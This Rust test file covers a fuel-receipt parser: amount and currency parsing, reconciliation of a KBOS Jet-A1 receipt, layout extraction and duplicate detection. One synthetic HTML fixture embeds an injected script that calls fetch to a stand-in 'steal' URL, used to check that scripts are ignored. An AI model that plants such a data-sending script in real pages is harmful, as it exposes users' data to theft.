//! Receipt parsing tests. The GSX amounts below are the owner-verified figures of a real Fuel receipt
//! (KBOS, 2026-10-17); the HTML used here is a SYNTHETIC test layout, not GSX's markup.

use super::fuel::*;
use super::import::*;
use super::money::*;

fn amt(text: &str) -> PrintedAmount {
    parse_amount(text).unwrap_or_else(|| panic!("unparseable amount {text}"))
}

fn line(kind: LineKind, description: &str, amount: &str) -> ReceiptLine {
    ReceiptLine { kind, description: description.into(), quantity: None, unit: None, unit_price: None, amount: amt(amount) }
}

// ---------- printed numbers ----------

#[test]
fn decimals_keep_their_text_and_exact_value() {
    let d = parse_decimal("5,147").unwrap();
    assert_eq!((d.units, d.scale, d.text.as_str()), (5147, 0, "5,147"));
    let d = parse_decimal("25,317.89").unwrap();
    assert_eq!((d.units, d.scale), (2_531_789, 2));
    let d = parse_decimal("0.80").unwrap();
    assert_eq!((d.units, d.scale), (80, 2));
    assert_eq!(parse_decimal("-12.5").unwrap().units, -125);
    for bad in ["", "1,23", "12,34.5", "1.2.3", "1.", "abc", "1e5", "1 000", ",123", "1,234,56"] {
        assert!(parse_decimal(bad).is_none(), "{bad:?} must be rejected");
    }
}

#[test]
fn amounts_recognise_codes_and_flag_bare_symbols() {
    assert_eq!(amt("USD 25,317.89").currency, CurrencyMark::Code { code: "USD".into() });
    assert_eq!(amt("1,122.14 USD").currency, CurrencyMark::Code { code: "USD".into() });
    assert_eq!(amt("$4.92").currency, CurrencyMark::AmbiguousSymbol { symbol: "$".into() });
    assert_eq!(amt("€ 12.00").currency, CurrencyMark::AmbiguousSymbol { symbol: "€".into() });
    assert_eq!(amt("28,022.40").currency, CurrencyMark::None);
    assert!(parse_amount("XYZ 10.00").is_none(), "unknown ISO-looking code is never guessed");
    assert!(parse_amount("USD ten").is_none());
}

#[test]
fn minor_units_are_integers_and_never_rounded() {
    assert_eq!(to_minor_units(&amt("USD 25,317.89").value, "USD"), Some(2_531_789));
    assert_eq!(to_minor_units(&amt("USD 25").value, "USD"), Some(2500));
    assert_eq!(to_minor_units(&amt("JPY 1,200").value, "JPY"), Some(1200));
    assert_eq!(to_minor_units(&amt("1.005").value, "USD"), None, "more precision than the currency has is refused");
    assert_eq!(to_minor_units(&amt("JPY 1.5").value, "JPY"), None);
}

// ---------- currency recognition ----------

#[test]
fn currency_is_explicit_only_from_a_printed_code() {
    let a = [amt("USD 25,317.89"), amt("USD 1,122.14"), amt("$28,022.40")];
    assert_eq!(recognize_currency(a.iter()), CurrencyRecognition::Explicit { code: "USD".into() });
    let only_symbols = [amt("$25,317.89"), amt("$28,022.40")];
    assert!(matches!(recognize_currency(only_symbols.iter()), CurrencyRecognition::Ambiguous { .. }));
    let mixed = [amt("USD 10.00"), amt("EUR 9.20")];
    assert!(matches!(recognize_currency(mixed.iter()), CurrencyRecognition::Ambiguous { .. }));
    let conflicting = [amt("USD 10.00"), amt("€9.20")];
    assert!(matches!(recognize_currency(conflicting.iter()), CurrencyRecognition::Ambiguous { .. }));
    let none = [amt("10.00")];
    assert_eq!(recognize_currency(none.iter()), CurrencyRecognition::Missing);
}

// ---------- reconciliation with the verified KBOS figures ----------

fn kbos_fields() -> FuelReceiptFields {
    let mut fuel = line(LineKind::Charge, "Jet-A1", "USD 25,317.89");
    fuel.quantity = parse_decimal("5,147");
    fuel.unit = Some("gal".into());
    fuel.unit_price = parse_amount("$4.92");
    FuelReceiptFields {
        receipt_id: Some("GSX-20261017T164423Z-KBOS".into()),
        provider: Some("Lukoil".into()),
        airport: Some("KBOS".into()),
        product: Some("Jet-A1".into()),
        lines: vec![
            fuel,
            line(LineKind::Tax, "Federal fuel tax", "USD 1,122.14"),
            line(LineKind::Tax, "Massachusetts state sales tax", "USD 1,582.37"),
        ],
        total: parse_amount("USD 28,022.40"),
        ..Default::default()
    }
}

#[test]
fn verified_kbos_receipt_reconciles_exactly() {
    let r = evaluate(kbos_fields(), "hash");
    assert_eq!(r.status, ParseStatus::Verified, "issues: {:?}", r.issues);
    assert_eq!(r.currency, CurrencyRecognition::Explicit { code: "USD".into() });
    let rec = r.reconciliation.unwrap();
    assert_eq!((rec.lines_minor, rec.total_minor, rec.difference_minor), (2_802_240, 2_802_240, 0));
    assert_eq!(r.cost_kind, "simulated_gsx_cost");
}

#[test]
fn a_rounded_unit_price_never_blocks_verification() {
    // 5,147 gal × $4.92 = $25,323.24, printed line is $25,317.89: the price is rounded for display.
    let r = evaluate(kbos_fields(), "hash");
    assert_eq!(r.status, ParseStatus::Verified);
    assert!(r.notes.is_empty(), "within display rounding: {:?}", r.notes);
    let f = &r.fields.lines[0];
    assert_eq!(f.quantity.as_ref().unwrap().text, "5,147");
    assert_eq!(f.unit_price.as_ref().unwrap().text, "$4.92");
}

#[test]
fn a_unit_price_far_off_is_noted_but_still_not_a_blocker() {
    let mut fields = kbos_fields();
    fields.lines[0].unit_price = parse_amount("$5.92");
    let r = evaluate(fields, "hash");
    assert_eq!(r.status, ParseStatus::Verified);
    assert_eq!(r.notes.len(), 1);
}

#[test]
fn a_total_that_does_not_add_up_needs_review() {
    let mut fields = kbos_fields();
    fields.total = parse_amount("USD 28,022.41");
    let r = evaluate(fields, "hash");
    assert_eq!(r.status, ParseStatus::NeedsReview);
    assert_eq!(r.reconciliation.unwrap().difference_minor, 1);
}

#[test]
fn missing_or_ambiguous_currency_needs_review() {
    let mut fields = kbos_fields();
    for l in &mut fields.lines {
        l.amount = parse_amount(&format!("${}", l.amount.value.text)).unwrap();
    }
    fields.total = parse_amount("$28,022.40");
    let r = evaluate(fields, "hash");
    assert_eq!(r.status, ParseStatus::NeedsReview);
    assert!(r.issues.iter().any(|i| i.contains("currency ambiguous")));
    assert!(r.reconciliation.is_none());
}

#[test]
fn missing_total_identifier_or_lines_need_review() {
    let mut f = kbos_fields();
    f.total = None;
    assert_eq!(evaluate(f, "h").status, ParseStatus::NeedsReview);
    let mut f = kbos_fields();
    f.receipt_id = None;
    assert_eq!(evaluate(f, "h").status, ParseStatus::NeedsReview);
    let mut f = kbos_fields();
    f.lines.clear();
    assert_eq!(evaluate(f, "h").status, ParseStatus::NeedsReview);
}

#[test]
fn surcharges_add_and_discounts_subtract() {
    let lines = vec![line(LineKind::Charge, "x", "USD 100.00"), line(LineKind::Surcharge, "s", "USD 5.00"), line(LineKind::Discount, "d", "USD 10.00")];
    let r = reconcile(&lines, &amt("USD 95.00"), "USD").unwrap();
    assert_eq!(r.difference_minor, 0);
}

// ---------- pipeline (synthetic test layout, NOT GSX's markup) ----------

const SYNTHETIC: &str = r#"<!doctype html><html><head><style>.x{color:red}</style>
<script>document.title = "pwned"; fetch("https://example.invalid/steal");</script></head>
<body data-test-layout="synthetic-fuel-v0">
<span class="rid">TEST-RECEIPT-0001</span>
<table><tr class="line" data-kind="charge"><td class="d">Jet-A1</td><td class="a">USD 100.00</td></tr>
<tr class="line" data-kind="tax"><td class="d">Tax</td><td class="a">USD 7.50</td></tr></table>
<span class="total">USD 107.50</span><img src="data:image/png;base64,AAAA"></body></html>"#;

fn synthetic_layout() -> FuelLayout {
    FuelLayout {
        id: "synthetic-fuel-v0",
        matches: |d| d.exists("body[data-test-layout='synthetic-fuel-v0']"),
        extract: |d| FuelReceiptFields {
            receipt_id: d.text(".rid"),
            lines: d
                .texts("tr.line")
                .iter()
                .zip(d.texts("tr.line td.d"))
                .zip(d.texts("tr.line td.a"))
                .map(|((_, desc), a)| ReceiptLine { kind: if desc == "Tax" { LineKind::Tax } else { LineKind::Charge }, description: desc, quantity: None, unit: None, unit_price: None, amount: parse_amount(&a).unwrap() })
                .collect(),
            total: d.text(".total").and_then(|t| parse_amount(&t)),
            ..Default::default()
        },
    }
}

#[test]
fn pipeline_verifies_a_recognised_layout_and_ignores_scripts() {
    let r = parse_fuel_receipt(SYNTHETIC.as_bytes(), &[synthetic_layout()]);
    assert_eq!(r.status, ParseStatus::Verified, "{:?}", r.issues);
    assert_eq!(r.layout, Some("synthetic-fuel-v0"));
    assert_eq!(r.fields.receipt_id.as_deref(), Some("TEST-RECEIPT-0001"));
    let doc_text = format!("{:?}", r.fields);
    assert!(!doc_text.contains("pwned") && !doc_text.contains("fetch"), "script text never reaches extracted fields");
}

#[test]
fn unknown_layouts_are_unsupported_never_verified() {
    let r = parse_fuel_receipt(b"<html><body><p>Fuel USD 1.00 total USD 1.00</p></body></html>", &[synthetic_layout()]);
    assert_eq!(r.status, ParseStatus::UnsupportedFormat);
    assert!(r.reconciliation.is_none());
    assert_eq!(parse_fuel_receipt(SYNTHETIC.as_bytes(), &[]).status, ParseStatus::UnsupportedFormat);
}

#[test]
fn oversized_and_non_utf8_files_are_unreadable() {
    let big = vec![b'a'; MAX_RECEIPT_BYTES + 1];
    assert_eq!(parse_fuel_receipt(&big, &[synthetic_layout()]).status, ParseStatus::Unreadable);
    assert_eq!(parse_fuel_receipt(&[0xff, 0xfe, 0x00], &[synthetic_layout()]).status, ParseStatus::Unreadable);
}

#[test]
fn sha256_is_of_the_exact_bytes() {
    assert_eq!(sha256_hex(b"abc"), "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
    let r = parse_fuel_receipt(SYNTHETIC.as_bytes(), &[synthetic_layout()]);
    assert_eq!(r.sha256, sha256_hex(SYNTHETIC.as_bytes()));
}

// ---------- import decisions ----------

#[test]
fn identical_content_is_a_duplicate_similar_content_only_a_possible_revision() {
    let known = vec![KnownReceipt { id: "r1".into(), sha256: "aaa".into(), receipt_id: Some("GSX-X".into()) }];
    assert_eq!(decide(&known, "aaa", Some("GSX-X")), ImportDecision::DuplicateContent { existing: "r1".into() });
    assert_eq!(decide(&known, "bbb", Some("GSX-X")), ImportDecision::PossibleRevision { existing: vec!["r1".into()] });
    assert_eq!(decide(&known, "bbb", Some("GSX-Y")), ImportDecision::New);
    assert_eq!(decide(&known, "bbb", None), ImportDecision::New);
}
